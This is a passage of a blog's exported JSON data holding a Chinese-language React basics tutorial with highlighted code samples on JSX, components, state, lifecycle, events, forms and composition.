&lt;UserInfo user=&#123;props.author&#125; /&gt;</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"Comment-text\"</span>&gt;&#123;props.text&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;div className=\"Comment-date\"&gt;&#123;formatDate(props.date)&#125;&lt;/</span>div&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Props-与-State\"><a href=\"#Props-与-State\" class=\"headerlink\" title=\"Props 与 State\"></a>Props 与 State</h2><p>组件可以把它的 state 作为 props 向下传递到它的子组件中，而子组件不能直接修改 props，只能通过事件通知父级修改；state 是记录自身状态的私有属性，可以修改。这种数据流向是“自上而下”的，一般称为单向数据流。</p>\n<p>props.children 可以理解为插槽。</p>\n<p>state 修改需要注意三点：</p>\n<ol>\n<li>不要直接修改 State，而是调用 <code>setState()</code>方法；</li>\n<li>State 的更新可能是异步的，因此不能依赖当前状态去更新下一个状态；</li>\n<li>State 的更新会被合并。</li>\n</ol>\n<h2 id=\"生命周期\"><a href=\"#生命周期\" class=\"headerlink\" title=\"生命周期\"></a>生命周期</h2><p>组件的生命周期图谱如下：<br><img src=\"/react-basic/life.jpg\" alt=\"生命周期图谱\"><br>通常在 constructor 中进行 state 等初始化工作，componentDidMount 中进行 DOM 渲染完成后的工作，componentWillUnmount 中进行资源释放工作。示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Clock</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123; <span class=\"attr\">date</span>: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>() &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.timerID = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.tick(), <span class=\"number\">1000</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  componentWillUnmount() &#123;</span><br><span class=\"line\">    clearInterval(<span class=\"keyword\">this</span>.timerID);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  tick() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">      date: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;h1&gt;Hello, world!<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\">        &lt;h2&gt;It is &#123;<span class=\"keyword\">this</span>.state.date.toLocaleTimeString()&#125;.&lt;<span class=\"regexp\">/h2&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Clock</span> /&gt;</span>, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure>\n<p>更多生命周期介绍请参考<a href=\"http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>\n<h2 id=\"事件处理\"><a href=\"#事件处理\" class=\"headerlink\" title=\"事件处理\"></a>事件处理</h2><p>React 元素的事件处理和 DOM 元素的很相似，但是有一点语法上的不同:</p>\n<ul>\n<li>React 事件的命名采用小驼峰式（camelCase），而不是纯小写。</li>\n<li>使用 JSX 语法时你需要传入一个函数作为事件处理函数，而不是一个字符串。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;button onClick=&#123;activateLasers&#125;&gt;Activate Lasers&lt;<span class=\"regexp\">/button&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><h4 id=\"不能通过放回-false-的方式组织默认行为，而是要显式的使用-preventDefault\"><a href=\"#不能通过放回-false-的方式组织默认行为，而是要显式的使用-preventDefault\" class=\"headerlink\" title=\"不能通过放回 false 的方式组织默认行为，而是要显式的使用 preventDefault\"></a>不能通过放回 false 的方式组织默认行为，而是要显式的使用 preventDefault</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 错误 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"console.log('The link was clicked.'); return false\"</span>&gt;</span></span><br><span class=\"line\">  Click me</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 正确</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ActionLink</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handleClick</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    e.preventDefault();</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'The link was clicked.'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;a href=<span class=\"string\">\"#\"</span> onClick=&#123;handleClick&#125;&gt;</span><br><span class=\"line\">      Click me</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/a&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"回调函数中的-this-绑定问题\"><a href=\"#回调函数中的-this-绑定问题\" class=\"headerlink\" title=\"回调函数中的 this 绑定问题\"></a>回调函数中的 this 绑定问题</h4><p>因为传入的回调函数在调用的时候上下文（context）已经不是该组件实例本身，所以想要 this 指向该组件实例本身，需要传入的时候显式的指定上下文。</p>\n<p>bind 用法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Title</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  handleClickOnTitle(e) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;this.handleClickOnTitle.bind(this)&#125;</span>&gt;</span>React 小书<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>class fields 用法（Create React App 默认启用此语法）：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LoggingButton</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 此语法确保 `handleClick` 内的 `this` 已被绑定。</span></span><br><span class=\"line\">  <span class=\"comment\">// 注意: 这是 *实验性* 语法。</span></span><br><span class=\"line\">  handleClick = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'this is:'</span>, <span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;this.handleClick&#125;</span>&gt;</span>Click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>箭头函数用法：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LoggingButton</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  handleClick() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'this is:'</span>, <span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 此语法确保 `handleClick` 内的 `this` 已被绑定。</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;e</span> =&gt;</span> this.handleClick(e)&#125;&gt;Click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"条件渲染与列表\"><a href=\"#条件渲染与列表\" class=\"headerlink\" title=\"条件渲染与列表\"></a>条件渲染与列表</h2><p>JSX 只是 JavaScript 的语法糖，可以完全使用 JavaScript 特性。对于列表渲染，需要在加上 key，值只要保证兄弟节点间唯一即可。</p>\n<h2 id=\"表单\"><a href=\"#表单\" class=\"headerlink\" title=\"表单\"></a>表单</h2><h3 id=\"受控组件\"><a href=\"#受控组件\" class=\"headerlink\" title=\"受控组件\"></a>受控组件</h3><p>表单数据由 React 组件来管理。具体实现形式如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NameForm</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123; <span class=\"attr\">value</span>: <span class=\"string\">''</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.handleChange = <span class=\"keyword\">this</span>.handleChange.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.handleSubmit = <span class=\"keyword\">this</span>.handleSubmit.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  handleChange(event) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123; <span class=\"attr\">value</span>: event.target.value &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  handleSubmit(event) &#123;</span><br><span class=\"line\">    alert(<span class=\"string\">'提交的名字: '</span> + <span class=\"keyword\">this</span>.state.value);</span><br><span class=\"line\">    event.preventDefault();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;form onSubmit=&#123;<span class=\"keyword\">this</span>.handleSubmit&#125;&gt;</span><br><span class=\"line\">        &lt;label&gt;</span><br><span class=\"line\">          名字:</span><br><span class=\"line\">          &lt;input</span><br><span class=\"line\">            type=<span class=\"string\">\"text\"</span></span><br><span class=\"line\">            value=&#123;<span class=\"keyword\">this</span>.state.value&#125;</span><br><span class=\"line\">            onChange=&#123;<span class=\"keyword\">this</span>.handleChange&#125;</span><br><span class=\"line\">          /&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/label&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;input type=\"submit\" value=\"提交\" /</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/form&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>作为受控组件，<code>&lt;textarea&gt;</code> 和 <code>&lt;select&gt;</code>元素赋值形式做了调整，改成与 input 相同，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;textarea value=&#123;<span class=\"keyword\">this</span>.state.value&#125; onChange=&#123;<span class=\"keyword\">this</span>.handleChange&#125; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;select value=&#123;<span class=\"keyword\">this</span>.state.value&#125; onChange=&#123;<span class=\"keyword\">this</span>.handleChange&#125;&gt;</span><br><span class=\"line\">  &lt;option value=<span class=\"string\">\"grapefruit\"</span>&gt;葡萄柚&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;option value=\"lime\"&gt;酸橙&lt;/</span>option&gt;</span><br><span class=\"line\">  &lt;option value=<span class=\"string\">\"coconut\"</span>&gt;椰子&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;option value=\"mango\"&gt;芒果&lt;/</span>option&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/select&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意点：</p>\n<p>文件 input 标签为非受控组件<code>&lt;input type=&quot;file&quot; /&gt;</code>。</p>\n<p>设置了 value 值的受控组件是不可编辑的，若仍然可编辑，那可能是 value 值为 undefined 或 null。</p>\n<h3 id=\"非受控组件\"><a href=\"#非受控组件\" class=\"headerlink\" title=\"非受控组件\"></a>非受控组件</h3><p>将在高级部分讲解，<a href=\"https://zh-hans.reactjs.org/docs/uncontrolled-components.html\" target=\"_blank\" rel=\"noopener\">官方文档</a>。</p>\n<h2 id=\"状态提升\"><a href=\"#状态提升\" class=\"headerlink\" title=\"状态提升\"></a>状态提升</h2><p>通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。</p>\n<h2 id=\"组合-vs-继承\"><a href=\"#组合-vs-继承\" class=\"headerlink\" title=\"组合 vs 继承\"></a>组合 vs 继承</h2><p>React 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用。</p>\n<h3 id=\"包含关系\"><a href=\"#包含关系\" class=\"headerlink\" title=\"包含关系\"></a>包含关系</h3><p>概念同 Vue 的插槽</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 匿名</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">FancyBorder</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div className=&#123;<span class=\"string\">'FancyBorder FancyBorder-'</span> + props.color&#125;&gt;</span><br><span class=\"line\">      &#123;props.children&#125;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">function WelcomeDialog() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;FancyBorder color=\"blue\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;h1 className=\"Dialog-title\"&gt;Welcome&lt;/</span>h1&gt;</span><br><span class=\"line\">      &lt;p className=<span class=\"string\">\"Dialog-message\"</span>&gt;Thank you <span class=\"keyword\">for</span> visiting our spacecraft!<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span><br><span class=\"line\">    &lt;<span class=\"regexp\">/FancyBorder&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ 具名</span></span><br><span class=\"line\"><span class=\"regexp\">function SplitPane(props) &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;div className=\"SplitPane\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;div className=\"SplitPane-left\"&gt;&#123;props.left&#125;&lt;/</span>div&gt;</span><br><span class=\"line\">      &lt;div className=<span class=\"string\">\"SplitPane-right\"</span>&gt;&#123;props.right&#125;&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>div&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">App</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">SplitPane</span> <span class=\"attr\">left</span>=<span class=\"string\">&#123;</span>&lt;<span class=\"attr\">Contacts</span> /&gt;</span>&#125; right=&#123;<span class=\"tag\">&lt;<span class=\"name\">Chat</span> /&gt;</span>&#125; /&gt;;</span></span><br><span class=\"line\"><span class=\"xml\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"http://huziketang.mangojuice.top/books/react/lesson9\" target=\"_blank\" rel=\"noopener\">http://huziketang.mangojuice.top/books/react/lesson9</a></p>\n<p><a href=\"https://zh-hans.reactjs.org/docs/introducing-jsx.html\" target=\"_blank\" rel=\"noopener\">https://zh-hans.reactjs.org/docs/introducing-jsx.html</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>对 React 的基础知识作一个总结。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, world!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"JSX\"><a href=\"#JSX\" class=\"headerlink\" title=\"JSX\"></a>JSX</h2><p>不是新事物，而是一种语法糖，Babel 转译后调用 React.createElement() ，因此具有 JavaScript 的全部功能。</p>\n<p>类似一些前端模板引擎的语法，JSX 中用大括号<code>{}</code>来包裹 JavaScript 变量和表达式。</p>\n<p>属性用 camelCase 命名法，例如 class-className、tabindex-tabIndex。属性值如果是字符串值直接用引号，如果是表达式用大括号。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 引用变量</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> name = <span class=\"string\">'Josh Perez'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;name&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 引用表达式</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">formatName</span>(<span class=\"params\">user</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> user.firstName + <span class=\"string\">' '</span> + user.lastName;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> user = &#123;</span><br><span class=\"line\">  firstName: <span class=\"string\">'Harper'</span>,</span><br><span class=\"line\">  lastName: <span class=\"string\">'Perez'</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Hello, &#123;formatName(user)&#125;!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(element, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 属性值为字符串</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> element = <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">tabIndex</span>=<span class=\"string\">\"0\"</span> /&gt;</span>;</span></span><br><span class=\"line\"><span class=\"xml\"></span></span><br><span class=\"line\"><span class=\"xml\">// 属性值为表达式</span></span><br><span class=\"line\">const element = &lt;img src=&#123;user.avatarUrl&#125; /&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 需要把 CSS 属性变成一个对象再传给元素</span><br><span class=\"line\">const element = &lt;h1 style=&#123;&#123; fontSize: '12px', color: 'red' &#125;&#125;&gt;hello react&lt;/h1&gt;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"元素\"><a href=\"#元素\" class=\"headerlink\" title=\"元素\"></a>元素</h2><p>元素是构成 React 应用的最小砖块。React 元素是不可变对象。一旦被创建，你就无法更改它的子元素或者属性。一个元素就像电影的单帧：它代表了某个特定时刻的 UI。更新 UI 唯一的方式是创建一个全新的元素，并将其传入 ReactDOM.render()。</p>\n<h2 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h2><p>组件是独立可复用的代码片段，由一个或多个元素组成，是根据 UI 需要对元素的进一步抽象封装，因此可以自由的拆分组合使用，就像使用 HTML 元素那样。形式上分为函数组件和 class 组件，一般不需要维护私有状态 state 的，推荐用函数组件。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span 